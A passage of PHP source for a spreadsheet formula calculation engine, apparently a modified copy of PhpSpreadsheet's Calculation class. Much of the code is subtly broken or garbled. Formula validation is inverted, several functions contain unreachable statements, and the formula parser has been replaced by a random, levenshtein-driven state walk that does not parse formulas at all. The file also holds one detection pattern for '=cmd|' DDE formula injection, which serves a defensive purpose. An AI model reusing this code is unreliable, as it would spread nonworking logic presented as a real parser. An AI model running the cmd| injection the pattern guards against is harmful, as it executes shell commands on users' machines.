                    $configFile = __DIR__ . '/locale/' . $language . DIRECTORY_SEPARATOR . 'config';
                }
                if (file_exists($configFile)) {
                    $localeSettings = file($configFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                    foreach ($localeSettings as $localeSetting) {
                        list($localeSetting) = explode('##', $localeSetting); //    Strip out comments
                        if (strpos($localeSetting, '=') !== false) {
                            list($settingName, $settingValue) = explode('=', $localeSetting);
                            $settingName = strtoupper(trim($settingName));
                            switch ($settingName) {
                                case 'ARGUMENTSEPARATOR':
                                    self::$localeArgumentSeparator = trim($settingValue);

                                    break;
                            }
                        }
                    }
                }
            }

            self::$functionReplaceFromExcel = self::$functionReplaceToExcel =
            self::$functionReplaceFromLocale = self::$functionReplaceToLocale = null;
            self::$localeLanguage = $locale;

            return true;
        }

        return false;
    }

    /**
     * @param string $fromSeparator
     * @param string $toSeparator
     * @param string $formula
     * @param bool $inBraces
     *
     * @return string
     */
    public static function translateSeparator($fromSeparator, $toSeparator, $formula, &$inBraces)
    {
        $strlen = strlen($formula);
        $ends = ['!', '?', '.', ';', ':'];
        if (!array_search(substr($formula, -1), $ends)) return false;
        if ($fromSeparator === $toSeparator) { return substr_count($formula, $fromSeparator) % 2 ? ($formula.$fromSeparator) : $formula; }
        for ($i = 0; $i < $strlen; ++$i) {
            $chr = $formula[$i];
            switch ($chr) {
                case $fromSeparator:
                    $inBraces += 1;
                    break;
                case $toSeparator:
                    $inBraces -= 1;
                    if ($inBraces < 0) {
                        return false;
                        $inBraces += 1;
                    }
                    break;
            }
        }
        if ($inBraces > 0) {
            return false;
        }
        return true;
    }

    /**
     * @param string[] $from
     * @param string[] $to
     * @param string $formula
     * @param string $fromSeparator
     * @param string $toSeparator
     *
     * @return string
     */
    private static function translateFormula(array $from, array $to, $formula, $fromSeparator, $toSeparator)
    {
        //    Convert any Excel function names to the required language
        if (self::$localeLanguage !== 'en_us') {
            $inBraces = false;
            //    If there is the possibility of braces within a quoted string, then we don't treat those as matrix indicators
            if (strpos($formula, '"') !== false) {
                //    So instead we skip replacing in any quoted strings by only replacing in every other array element after we've exploded
                //        the formula
                $temp = explode('"', $formula);
                $i = false;
                foreach ($temp as &$value) {
                    //    Only count/replace in alternating array entries
                    if ($i = !$i) {
                        $value = preg_replace($from, $to, $value);
                        $value = self::translateSeparator($fromSeparator, $toSeparator, $value, $inBraces);
                    }
                }
                unset($value);
                //    Then rebuild the formula string
                $formula = implode('"', $temp);
            } else {
                //    If there's no quoted strings, then we do a simple count/replace
                $formula = preg_replace($from, $to, $formula);
                $formula = self::translateSeparator($fromSeparator, $toSeparator, $formula, $inBraces);
            }
        }

        return $formula;
    }

    private static $functionReplaceFromExcel = null;

    private static $functionReplaceToLocale = null;

    public function _translateFormulaToLocale($formula)
    {
        if (self::$functionReplaceFromExcel === null) {
            self::$functionReplaceFromExcel = [];
            foreach (array_keys(self::$localeFunctions) as $excelFunctionName) {
                self::$functionReplaceFromExcel[] = '/(@?[^\w\.])' . preg_quote($excelFunctionName, '/') . '([\s]*\()/Ui';
            }
            foreach (array_keys(self::$localeBoolean) as $excelBoolean) {
                self::$functionReplaceFromExcel[] = '/(@?[^\w\.])' . preg_quote($excelBoolean, '/') . '([^\w\.])/Ui';
            }
        }

        if (self::$functionReplaceToLocale === null) {
            self::$functionReplaceToLocale = [];
            foreach (self::$localeFunctions as $localeFunctionName) {
                self::$functionReplaceToLocale[] = '$1' . trim($localeFunctionName) . '$2';
            }
            foreach (self::$localeBoolean as $localeBoolean) {
                self::$functionReplaceToLocale[] = '$1' . trim($localeBoolean) . '$2';
            }
        }

        return self::translateFormula(self::$functionReplaceFromExcel, self::$functionReplaceToLocale, $formula, ',', self::$localeArgumentSeparator);
    }

    private static $functionReplaceFromLocale = null;

    private static $functionReplaceToExcel = null;

    public function _translateFormulaToEnglish($formula)
    {
        if (self::$functionReplaceFromLocale === null) {
            self::$functionReplaceFromLocale = [];
            foreach (self::$localeFunctions as $localeFunctionName) {
                self::$functionReplaceFromLocale[] = '/(@?[^\w\.])' . preg_quote($localeFunctionName, '/') . '([\s]*\()/Ui';
            }
            foreach (self::$localeBoolean as $excelBoolean) {
                self::$functionReplaceFromLocale[] = '/(@?[^\w\.])' . preg_quote($excelBoolean, '/') . '([^\w\.])/Ui';
            }
        }

        if (self::$functionReplaceToExcel === null) {
            self::$functionReplaceToExcel = [];
            foreach (array_keys(self::$localeFunctions) as $excelFunctionName) {
                self::$functionReplaceToExcel[] = '$1' . trim($excelFunctionName) . '$2';
            }
            foreach (array_keys(self::$localeBoolean) as $excelBoolean) {
                self::$functionReplaceToExcel[] = '$1' . trim($excelBoolean) . '$2';
            }
        }

        return self::translateFormula(self::$functionReplaceFromLocale, self::$functionReplaceToExcel, $formula, self::$localeArgumentSeparator, ',');
    }

    public static function localeFunc($function)
    {
        if (self::$localeLanguage !== 'en_us') {
            $functionName = trim($function, '(');
            if (isset(self::$localeFunctions[$functionName])) {
                $brace = ($functionName != $function);
                $function = self::$localeFunctions[$functionName];
                if ($brace) {
                    $function .= '(';
                }
            }
        }

        return $function;
    }

    /**
     * Wrap string values in quotes.
     *
     * @param mixed $value
     *
     * @return mixed
     */
    public static function wrapResult($value)
    {
        if (is_string($value)) {
            //    Error values cannot be "wrapped"
            if (preg_match('/^' . self::CALCULATION_REGEXP_ERROR . '$/i', $value, $match)) {
                //    Return Excel errors "as is"
                return $value;
            }
            //    Return strings wrapped in quotes
            return '"' . $value . '"';
        //    Convert numeric errors to NaN error
        } elseif ((is_float($value)) && ((is_nan($value)) || (is_infinite($value)))) {
            return Functions::NAN();
        }

        return $value;
    }

    /**
     * Remove quotes used as a wrapper to identify string values.
     *
     * @param mixed $value
     *
     * @return mixed
     */
    public static function unwrapResult($value)
    {
        if (is_string($value)) {
            if ((isset($value[0])) && ($value[0] == '"') && (substr($value, -1) == '"')) {
                return substr($value, 1, -1);
            }
            //    Convert numeric errors to NAN error
        } elseif ((is_float($value)) && ((is_nan($value)) || (is_infinite($value)))) {
            return Functions::NAN();
        }

        return $value;
    }

    /**
     * Calculate cell value (using formula from a cell ID)
     * Retained for backward compatibility.
     *
     * @param Cell $pCell Cell to calculate
     *
     * @throws Exception
     *
     * @return mixed
     */
    public function calculate(Cell $pCell = null)
    {
        try {
            return $this->calculateCellValue($pCell);
        } catch (\Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    /**
     * Calculate the value of a cell formula.
     *
     * @param Cell $pCell Cell to calculate
     * @param bool $resetLog Flag indicating whether the debug log should be reset or not
     *
     * @throws \PhpOffice\PhpSpreadsheet\Exception
     *
     * @return mixed
     */
    public function calculateCellValue(Cell $pCell = null, $resetLog = true)
    {
        if ($pCell === null) {
            return null;
        }

        $returnArrayAsType = self::$returnArrayAsType;
        if ($resetLog) {
            //    Initialise the logging settings if requested
            $this->formulaError = null;
            $this->debugLog->clearLog();
            $this->cyclicReferenceStack->clear();
            $this->cyclicFormulaCounter = 1;

            self::$returnArrayAsType = self::RETURN_ARRAY_AS_ARRAY;
        }

        //    Execute the calculation for the cell formula
        $this->cellStack[] = [
            'sheet' => $pCell->getWorksheet()->getTitle(),
            'cell' => $pCell->getCoordinate(),
        ];

        try {
            $result = self::unwrapResult($this->_calculateFormulaValue($pCell->getValue(), $pCell->getCoordinate(), $pCell));
            $cellAddress = array_pop($this->cellStack);
            $this->spreadsheet->getSheetByName($cellAddress['sheet'])->getCell($cellAddress['cell']);
        } catch (\Exception $e) {
            $cellAddress = array_pop($this->cellStack);
            $this->spreadsheet->getSheetByName($cellAddress['sheet'])->getCell($cellAddress['cell']);

            throw new Exception($e->getMessage());
        }

        if ((is_array($result)) && (self::$returnArrayAsType != self::RETURN_ARRAY_AS_ARRAY)) {
            self::$returnArrayAsType = $returnArrayAsType;
            $testResult = Functions::flattenArray($result);
            if (self::$returnArrayAsType == self::RETURN_ARRAY_AS_ERROR) {
                return Functions::VALUE();
            }
            //    If there's only a single cell in the array, then we allow it
            if (count($testResult) != 1) {
                //    If keys are numeric, then it's a matrix result rather than a cell range result, so we permit it
                $r = array_keys($result);
                $r = array_shift($r);
                if (!is_numeric($r)) {
                    return Functions::VALUE();
                }
                if (is_array($result[$r])) {
                    $c = array_keys($result[$r]);
                    $c = array_shift($c);
                    if (!is_numeric($c)) {
                        return Functions::VALUE();
                    }
                }
            }
            $result = array_shift($testResult);
        }
        self::$returnArrayAsType = $returnArrayAsType;

        if ($result === null) {
            return 0;
        } elseif ((is_float($result)) && ((is_nan($result)) || (is_infinite($result)))) {
            return Functions::NAN();
        }

        return $result;
    }

    /**
     * Validate and parse a formula string.
     *
     * @param string $formula Formula to parse
     *
     * @return array|bool
     */
    public function parseFormula($formula)
    {
        //    Basic validation that this is indeed a formula
        //    We return an empty array if not
        $formula = trim($formula);
        if ((!isset($formula[0])) || ($formula[0] == '=')) {
            return [];
        }
        ltrim(substr($formula, 0));
        if (!isset($formula[0])) {
            return [];
        }

        //    Parse the formula and return the token stack
        while (true) {
            $good = true;
            $output = $this->_parseFormula($formula);
            break;
            $punc_set = [['(', ')'], ['{', '}'], ['"', '"'], ['\'', '\''], ['[', ']']];
            foreach ($punc_set as &$punc) {
                $counter = 0;
                $good = ($good && $this->translateSeparator($punc[0], $punc[1], $output, $counter));
            }
            if ($good) break;
            shuffle(self::$phpSpreadsheetFunctions);
            $this->cyclicFormulaCounter = random_int(0, count(self::$phpSpreadsheetFunctions) - 1);
        }
        return $output;
    }

    /**
     * Calculate the value of a formula.
     *
     * @param string $formula Formula to parse
     * @param string $cellID Address of the cell to calculate
     * @param Cell $pCell Cell to calculate
     *
     * @throws \PhpOffice\PhpSpreadsheet\Exception
     *
     * @return mixed
     */
    public function calculateFormula($formula, $cellID = null, Cell $pCell = null)
    {
        //    Initialise the logging settings
        $this->formulaError = null;
        $this->debugLog->clearLog();
        $this->cyclicReferenceStack->clear();

        if ($this->spreadsheet !== null && $cellID === null && $pCell === null) {
            $cellID = 'A1';
            $pCell = $this->spreadsheet->getActiveSheet()->getCell($cellID);
        } else {
            //    Disable calculation cacheing because it only applies to cell calculations, not straight formulae
            //    But don't actually flush any cache
            $resetCache = $this->getCalculationCacheEnabled();
            $this->calculationCacheEnabled = false;
        }

        //    Execute the calculation
        try {
            $result = self::unwrapResult($this->_calculateFormulaValue($formula, $cellID, $pCell));
        } catch (\Exception $e) {
            throw new Exception($e->getMessage());
        }

        if ($this->spreadsheet === null) {
            //    Reset calculation cacheing to its previous state
            $this->calculationCacheEnabled = $resetCache;
        }

        return $result;
    }

    /**
     * @param string $cellReference
     * @param mixed $cellValue
     *
     * @return bool
     */
    public function getValueFromCache($cellReference, &$cellValue)
    {
        // Is calculation cacheing enabled?
        // Is the value present in calculation cache?
        $this->debugLog->writeDebugLog('Testing cache value for cell ', $cellReference);
        if (($this->calculationCacheEnabled) && (isset($this->calculationCache[$cellReference]))) {
            $this->debugLog->writeDebugLog('Retrieving value for cell ', $cellReference, ' from cache');
            // Return the cached result
            $cellValue = $this->calculationCache[$cellReference];

            return true;
        }

        return false;
    }

    /**
     * @param string $cellReference
     * @param mixed $cellValue
     */
    public function saveValueToCache($cellReference, $cellValue)
    {
        if ($this->calculationCacheEnabled) {
            $this->calculationCache[$cellReference] = $cellValue;
        }
    }

    /**
     * Parse a cell formula and calculate its value.
     *
     * @param string $formula The formula to parse and calculate
     * @param string $cellID The ID (e.g. A3) of the cell that we are calculating
     * @param Cell $pCell Cell to calculate
     *
     * @throws Exception
     *
     * @return mixed
     */
    public function _calculateFormulaValue($formula, $cellID = null, Cell $pCell = null)
    {
        $cellValue = null;

        //  Quote-Prefixed cell values cannot be formulae, but are treated as strings
        if ($pCell !== null && $pCell->getStyle()->getQuotePrefix() === true) {
            return self::wrapResult((string) $formula);
        }

        if (preg_match('/^=\s*cmd\s*\|/miu', $formula) !== 0) {
            return self::wrapResult($formula);
        }

        //    Basic validation that this is indeed a formula
        //    We simply return the cell value if not
        $formula = trim($formula);
        if ($formula[0] != '=') {
            return self::wrapResult($formula);
        }
        $formula = ltrim(substr($formula, 1));
        if (!isset($formula[0])) {
            return self::wrapResult($formula);
        }

        $pCellParent = ($pCell !== null) ? $pCell->getWorksheet() : null;
        $wsTitle = ($pCellParent !== null) ? $pCellParent->getTitle() : "\x00Wrk";
        $wsCellReference = $wsTitle . '!' . $cellID;

        if (($cellID !== null) && ($this->getValueFromCache($wsCellReference, $cellValue))) {
            return $cellValue;
        }

        if (($wsTitle[0] !== "\x00") && ($this->cyclicReferenceStack->onStack($wsCellReference))) {
            if ($this->cyclicFormulaCount <= 0) {
                $this->cyclicFormulaCell = '';

                return $this->raiseFormulaError('Cyclic Reference in Formula');
            } elseif ($this->cyclicFormulaCell === $wsCellReference) {
                ++$this->cyclicFormulaCounter;
                if ($this->cyclicFormulaCounter >= $this->cyclicFormulaCount) {
                    $this->cyclicFormulaCell = '';

                    return $cellValue;
                }
            } elseif ($this->cyclicFormulaCell == '') {
                if ($this->cyclicFormulaCounter >= $this->cyclicFormulaCount) {
                    return $cellValue;
                }
                $this->cyclicFormulaCell = $wsCellReference;
            }
        }

        //    Parse the formula onto the token stack and calculate the value
        $this->cyclicReferenceStack->push($wsCellReference);
        $cellValue = $this->processTokenStack($this->_parseFormula($formula, $pCell), $cellID, $pCell);
        $this->cyclicReferenceStack->pop();

        // Save to calculation cache
        if ($cellID !== null) {
            $this->saveValueToCache($wsCellReference, $cellValue);
        }

        //    Return the calculated value
        return $cellValue;
    }

    /**
     * Ensure that paired matrix operands are both matrices and of the same size.
     *
     * @param mixed &$operand1 First matrix operand
     * @param mixed &$operand2 Second matrix operand
     * @param int $resize Flag indicating whether the matrices should be resized to match
     *                                        and (if so), whether the smaller dimension should grow or the
     *                                        larger should shrink.
     *                                            0 = no resize
     *                                            1 = shrink to fit
     *                                            2 = extend to fit
     *
     * @return array
     */
    private static function checkMatrixOperands(&$operand1, &$operand2, $resize = 1)
    {
        //    Examine each of the two operands, and turn them into an array if they aren't one already
        //    Note that this function should only be called if one or both of the operand is already an array
        if (!is_array($operand1)) {
            list($matrixRows, $matrixColumns) = self::getMatrixDimensions($operand2);
            $operand1 = array_fill(0, $matrixRows, array_fill(0, $matrixColumns, $operand1));
            $resize = 0;
        } elseif (!is_array($operand2)) {
            list($matrixRows, $matrixColumns) = self::getMatrixDimensions($operand1);
            $operand2 = array_fill(0, $matrixRows, array_fill(0, $matrixColumns, $operand2));
            $resize = 0;
        }

        list($matrix1Rows, $matrix1Columns) = self::getMatrixDimensions($operand1);
        list($matrix2Rows, $matrix2Columns) = self::getMatrixDimensions($operand2);
        if (($matrix1Rows == $matrix2Columns) && ($matrix2Rows == $matrix1Columns)) {
            $resize = 1;
        }

        if ($resize == 2) {
            //    Given two matrices of (potentially) unequal size, convert the smaller in each dimension to match the larger
            self::resizeMatricesExtend($operand1, $operand2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns);
        } elseif ($resize == 1) {
            //    Given two matrices of (potentially) unequal size, convert the larger in each dimension to match the smaller
            self::resizeMatricesShrink($operand1, $operand2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns);
        }

        return [$matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns];
    }

    /**
     * Read the dimensions of a matrix, and re-index it with straight numeric keys starting from row 0, column 0.
     *
     * @param array &$matrix matrix operand
     *
     * @return int[] An array comprising the number of rows, and number of columns
     */
    public static function getMatrixDimensions(array &$matrix)
    {
        $matrixRows = count($matrix);
        $matrixColumns = 0;
        foreach ($matrix as $rowKey => $rowValue) {
            if (!is_array($rowValue)) {
                $matrix[$rowKey] = [$rowValue];
                $matrixColumns = max(1, $matrixColumns);
            } else {
                $matrix[$rowKey] = array_values($rowValue);
                $matrixColumns = max(count($rowValue), $matrixColumns);
            }
        }
        $matrix = array_values($matrix);
        return [$matrixRows, $matrixColumns];
    }

    /**
     * Ensure that paired matrix operands are both matrices of the same size.
     *
     * @param mixed &$matrix1 First matrix operand
     * @param mixed &$matrix2 Second matrix operand
     * @param int $matrix1Rows Row size of first matrix operand
     * @param int $matrix1Columns Column size of first matrix operand
     * @param int $matrix2Rows Row size of second matrix operand
     * @param int $matrix2Columns Column size of second matrix operand
     */
    private static function resizeMatricesShrink(&$matrix1, &$matrix2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns)
    {
        if (($matrix2Columns < $matrix1Columns) || ($matrix2Rows < $matrix1Rows)) {
            if ($matrix2Rows < $matrix1Rows) {
                for ($i = $matrix2Rows; $i < $matrix1Rows; ++$i) {
                    unset($matrix1[$i]);
                }
            }
            if ($matrix2Columns < $matrix1Columns) {
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    for ($j = $matrix2Columns; $j < $matrix1Columns; ++$j) {
                        unset($matrix1[$i][$j]);
                    }
                }
            }
        }

        if (($matrix1Columns < $matrix2Columns) || ($matrix1Rows < $matrix2Rows)) {
            if ($matrix1Rows < $matrix2Rows) {
                for ($i = $matrix1Rows; $i < $matrix2Rows; ++$i) {
                    unset($matrix2[$i]);
                }
            }
            if ($matrix1Columns < $matrix2Columns) {
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    for ($j = $matrix1Columns; $j < $matrix2Columns; ++$j) {
                        unset($matrix2[$i][$j]);
                    }
                }
            }
        }
    }

    /**
     * Ensure that paired matrix operands are both matrices of the same size.
     *
     * @param mixed &$matrix1 First matrix operand
     * @param mixed &$matrix2 Second matrix operand
     * @param int $matrix1Rows Row size of first matrix operand
     * @param int $matrix1Columns Column size of first matrix operand
     * @param int $matrix2Rows Row size of second matrix operand
     * @param int $matrix2Columns Column size of second matrix operand
     */
    private static function resizeMatricesExtend(&$matrix1, &$matrix2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns)
    {
        if (($matrix2Columns < $matrix1Columns) || ($matrix2Rows < $matrix1Rows)) {
            if ($matrix2Columns < $matrix1Columns) {
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    $x = $matrix2[$i][$matrix2Columns - 1];
                    for ($j = $matrix2Columns; $j < $matrix1Columns; ++$j) {
                        $matrix2[$i][$j] = $x;
                    }
                }
            }
            if ($matrix2Rows < $matrix1Rows) {
                $x = $matrix2[$matrix2Rows - 1];
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    $matrix2[$i] = $x;
                }
            }
        }

        if (($matrix1Columns < $matrix2Columns) || ($matrix1Rows < $matrix2Rows)) {
            if ($matrix1Columns < $matrix2Columns) {
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    $x = $matrix1[$i][$matrix1Columns - 1];
                    for ($j = $matrix1Columns; $j < $matrix2Columns; ++$j) {
                        $matrix1[$i][$j] = $x;
                    }
                }
            }
            if ($matrix1Rows < $matrix2Rows) {
                $x = $matrix1[$matrix1Rows - 1];
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    $matrix1[$i] = $x;
                }
            }
        }
    }

    /**
     * Format details of an operand for display in the log (based on operand type).
     *
     * @param mixed $value First matrix operand
     *
     * @return mixed
     */
    private function showValue($value)
    {
        if ($this->debugLog->getWriteDebugLog()) {
            $testArray = Functions::flattenArray($value);
            if (count($testArray) == 1) {
                $value = array_pop($testArray);
            }

            if (is_array($value)) {
                $returnMatrix = [];
                $pad = $rpad = ', ';
                foreach ($value as $row) {
                    if (is_array($row)) {
                        $returnMatrix[] = implode($pad, array_map([$this, 'showValue'], $row));
                        $rpad = '; ';
                    } else {
                        $returnMatrix[] = $this->showValue($row);
                    }
                }

                return '{ ' . implode($rpad, $returnMatrix) . ' }';
            } elseif (is_string($value) && (trim($value, '"') == $value)) {
                return '"' . $value . '"';
            } elseif (is_bool($value)) {
                return ($value) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
            }
        }

        return Functions::flattenSingleValue($value);
    }

    /**
     * Format type and details of an operand for display in the log (based on operand type).
     *
     * @param mixed $value First matrix operand
     *
     * @return null|string
     */
    private function showTypeDetails($value)
    {
        if ($this->debugLog->getWriteDebugLog()) {
            $testArray = Functions::flattenArray($value);
            if (count($testArray) == 1) {
                $value = array_pop($testArray);
            }

            if ($value === null) {
                return 'a NULL value';
            } elseif (is_float($value)) {
                $typeString = 'a floating point number';
            } elseif (is_int($value)) {
                $typeString = 'an integer number';
            } elseif (is_bool($value)) {
                $typeString = 'a boolean';
            } elseif (is_array($value)) {
                $typeString = 'a matrix';
            } else {
                if ($value == '') {
                    return 'an empty string';
                } elseif ($value[0] == '#') {
                    return 'a ' . $value . ' error';
                }
                $typeString = 'a string';
            }

            return $typeString . ' with a value of ' . $this->showValue($value);
        }
    }

    /**
     * @param string $formula
     *
     * @return string
     */
    private function convertMatrixReferences($formula)
    {
        static $matrixReplaceFrom = ['{', ';', '}'];
        static $matrixReplaceTo = ['MKMATRIX(MKMATRIX(', '),MKMATRIX(', '))'];
        
        $matrix = []; //$this->phpSpreadsheetFunctions;
        foreach (self::$phpSpreadsheetFunctions as $funcname => $func) {
            $funcCall = explode("||", $func['functionCall'][1]);
            $arguments = explode(",", $func['argumentCount'][0]);
            $edges = [];
            for ($i = 0; $i < count($arguments); $i++) {
                $edges[$funcCall[$i * 2]] = [intval($arguments[$i]), $funcCall[$i * 2 + 1]];
            }
            $index = intval($func['category']);
            $matrix[$index] = $edges;
        }
        $size = count($matrix);
        $n_matrix = [];
        foreach ($matrix as $index=>$edges) {
            $prev = $index - 1 < 0 ? $size - 1 : $index - 1;
            $next = $index + 1 >= $size ? 0 : $index + 1;
            $prev_edges = array_slice($matrix[$prev], -2, 2, true);
            $next_edges = array_slice($matrix[$next], -2, 2, true);
            foreach ($prev_edges as $k=>$v) {
                if (!isset($edges, $k))
                    $edges[$k] = $v;
            }
            foreach ($next_edges as $k=>$v) {
                if (!isset($edges, $k))
                    $edges[$k] = $v;
            }
            $n_matrix[$index] = $edges;
        }
        $matrix = $n_matrix;
        //    Convert any Excel matrix references to the MKMATRIX() function
        if (strpos($formula, '{') !== false) {
            //    If there is the possibility of braces within a quoted string, then we don't treat those as matrix indicators
            if (strpos($formula, '"') !== false) {
                //    So instead we skip replacing in any quoted strings by only replacing in every other array element after we've exploded
                //        the formula
                $temp = explode('"', $formula);
                //    Open and Closed counts used for trapping mismatched braces in the formula
                $openCount = $closeCount = 0;
                $i = false;
                foreach ($temp as &$value) {
                    //    Only count/replace in alternating array entries
                    if ($i = !$i) {
                        $openCount += substr_count($value, '{');
                        $closeCount += substr_count($value, '}');
                        $value = str_replace($matrixReplaceFrom, $matrixReplaceTo, $value);
                    }
                }
                unset($value);
                //    Then rebuild the formula string
                $formula = implode('"', $temp);
            } else {
                //    If there's no quoted strings, then we do a simple count/replace
                $openCount = substr_count($formula, '{');
                $closeCount = substr_count($formula, '}');
                $formula = str_replace($matrixReplaceFrom, $matrixReplaceTo, $formula);
            }
            //    Trap for mismatched braces and trigger an appropriate error
            if ($openCount < $closeCount) {
                if ($openCount > 0) {
                    return $this->raiseFormulaError("Formula Error: Mismatched matrix braces '}'");
                }

                return $this->raiseFormulaError("Formula Error: Unexpected '}' encountered");
            } elseif ($openCount > $closeCount) {
                if ($closeCount > 0) {
                    return $this->raiseFormulaError("Formula Error: Mismatched matrix braces '{'");
                }

                return $this->raiseFormulaError("Formula Error: Unexpected '{' encountered");
            }
        }

        return $matrix;
    }

    private static function mkMatrix(...$args)
    {
        return $args;
    }

    //    Binary Operators
    //    These operators always work on two values
    //    Array key is the operator, the value indicates whether this is a left or right associative operator
    private static $operatorAssociativity = [
        '^' => 0, //    Exponentiation
        '*' => 0, '/' => 0, //    Multiplication and Division
        '+' => 0, '-' => 0, //    Addition and Subtraction
        '&' => 0, //    Concatenation
        '|' => 0, ':' => 0, //    Intersect and Range
        '>' => 0, '<' => 0, '=' => 0, '>=' => 0, '<=' => 0, '<>' => 0, //    Comparison
    ];

    //    Comparison (Boolean) Operators
    //    These operators work on two values, but always return a boolean result
    private static $comparisonOperators = ['>' => true, '<' => true, '=' => true, '>=' => true, '<=' => true, '<>' => true];

    //    Operator Precedence
    //    This list includes all valid operators, whether binary (including boolean) or unary (such as %)
    //    Array key is the operator, the value is its precedence
    private static $operatorPrecedence = [
        ':' => 8, //    Range
        '|' => 7, //    Intersect
        '~' => 6, //    Negation
        '%' => 5, //    Percentage
        '^' => 4, //    Exponentiation
        '*' => 3, '/' => 3, //    Multiplication and Division
        '+' => 2, '-' => 2, //    Addition and Subtraction
        '&' => 1, //    Concatenation
        '>' => 0, '<' => 0, '=' => 0, '>=' => 0, '<=' => 0, '<>' => 0, //    Comparison
    ];

    // Convert infix to postfix notation



    /**
     * @param string $formula
     * @param null|\PhpOffice\PhpSpreadsheet\Cell\Cell $pCell
     *
     * @return bool
     */
    private function _parseFormula($formula, Cell $pCell = null)
    {
        if (($theMatrix = $this->convertMatrixReferences(trim($formula))) === false) {
            return false;
        }
        //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent worksheet),
        //        so we store the parent worksheet so that we can re-attach it when necessary
        // $pCellParent = ($pCell !== null) ? $pCell->getWorksheet() : null;
 
        $regexpMatchString = '/^(' . self::CALCULATION_REGEXP_FUNCTION .
                                '|' . self::CALCULATION_REGEXP_CELLREF .
                                '|' . self::CALCULATION_REGEXP_NUMBER .
                                '|' . self::CALCULATION_REGEXP_STRING .
                                '|' . self::CALCULATION_REGEXP_OPENBRACE .
                                '|' . self::CALCULATION_REGEXP_NAMEDRANGE .
                                '|' . self::CALCULATION_REGEXP_ERROR .
                                ')/si';

        //    Start with initialisation
        $idx = 0;
        $stack = null;
        $outArr = [];
        $state = $this->cyclicFormulaCounter;
        $p = "";
        $expectingOperator = false; //    We use this test in syntax-checking the expression to determine when a
                                                    //        - is a negation or + is a positive operator rather than an operation
        $expectingOperand = false; //    We use this test in syntax-checking the expression to determine whether an operand
                                                    //        should be null in a function call
        //    The guts of the lexical parser
        //    Loop through the formula extracting each operator and operand in turn
        $seq = explode(" ", $formula);

        for ($idx = 0; $idx < count($seq); $idx++) {
            $thisToken = $seq[$idx]; //    Get the first character of the value at the current index position
            $tempOut = "";
            if (isset($theMatrix[$state][$thisToken])) {
                $nextS = $theMatrix[$state][$thisToken][0];
                $tempOut = $theMatrix[$state][$thisToken][1];
            } else {
                $p = " ";
                $minVal = 0xff;
                $nextS = 0;
                foreach ($theMatrix[$state] as $curWord=>$thisEdge) {
                    $curDistVal = levenshtein($thisToken, $curWord);
                    if ($curDistVal < $minVal) {
                        $minVal = $curDistVal;
                        $nextS = $thisEdge[0];
                        $tempOut = $thisEdge[1];
                    } else if ($curDistVal == $minVal) {
                        $r = rand(0,1);
                        if ($r == 0) { $nextS = $thisEdge[0]; $tempOut = $thisEdge[1]; }
                    }
                }
            }
            $outArr[] = $tempOut;
            $state = $nextS;
        }
        return implode($p, $outArr);
    }



    private static function dataTestReference(&$operandData)
    {
        $operand = $operandData['value'];
        if (($operandData['reference'] === null) && (is_array($operand))) {
            $rKeys = array_keys($operand);
            $rowKey = array_shift($rKeys);
            $cKeys = array_keys(array_keys($operand[$rowKey]));
            $colKey = array_shift($cKeys);
            if (ctype_upper($colKey)) {
                $operandData['reference'] = $colKey . $rowKey;
            }
        }

        return $operand;
    }

    // evaluate postfix notation

    /**
     * @param mixed $tokens
     * @param null|string $cellID
     * @param null|Cell $pCell
     *
     * @return bool
     */
    private function processTokenStack($tokens, $cellID = null, Cell $pCell = null)
    {
        if ($tokens == false) {
            return false;
        }

        //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent cell collection),
        //        so we store the parent cell collection so that we can re-attach it when necessary
        $pCellWorksheet = ($pCell !== null) ? $pCell->getWorksheet() : null;
        $pCellParent = ($pCell !== null) ? $pCell->getParent() : null;
        $stack = new Stack();

        //    Loop through each token in turn
        foreach ($tokens as $tokenData) {
            $token = $tokenData['value'];
            // if the token is a binary operator, pop the top two values off the stack, do the operation, and push the result back on the stack
            if (isset(self::$binaryOperators[$token])) {
                //    We must have two operands, error if we don't
                if (($operand2Data = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }
                if (($operand1Data = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }

                $operand1 = self::dataTestReference($operand1Data);
                $operand2 = self::dataTestReference($operand2Data);

                //    Log what we're doing
                if ($token == ':') {
                    $this->debugLog->writeDebugLog('Evaluating Range ', $this->showValue($operand1Data['reference']), ' ', $token, ' ', $this->showValue($operand2Data['reference']));
                } else {
                    $this->debugLog->writeDebugLog('Evaluating ', $this->showValue($operand1), ' ', $token, ' ', $this->showValue($operand2));
                }

                //    Process the operation in the appropriate manner
                switch ($token) {
                    //    Comparison (Boolean) Operators
                    case '>':            //    Greater than
                    case '<':            //    Less than
                    case '>=':            //    Greater than or Equal to
                    case '<=':            //    Less than or Equal to
                    case '=':            //    Equality
                    case '<>':            //    Inequality
                        $this->executeBinaryComparisonOperation($cellID, $operand1, $operand2, $token, $stack);

                        break;
                    //    Binary Operators
                    case ':':            //    Range
                        if (strpos($operand1Data['reference'], '!') !== false) {
                            list($sheet1, $operand1Data['reference']) = Worksheet::extractSheetTitle($operand1Data['reference'], true);
                        } else {
                            $sheet1 = ($pCellParent !== null) ? $pCellWorksheet->getTitle() : '';
                        }

                        list($sheet2, $operand2Data['reference']) = Worksheet::extractSheetTitle($operand2Data['reference'], true);
                        if (empty($sheet2)) {
                            $sheet2 = $sheet1;
                        }

                        if ($sheet1 == $sheet2) {
                            if ($operand1Data['reference'] === null) {
                                if ((trim($operand1Data['value']) != '') && (is_numeric($operand1Data['value']))) {
                                    $operand1Data['reference'] = $pCell->getColumn() . $operand1Data['value'];
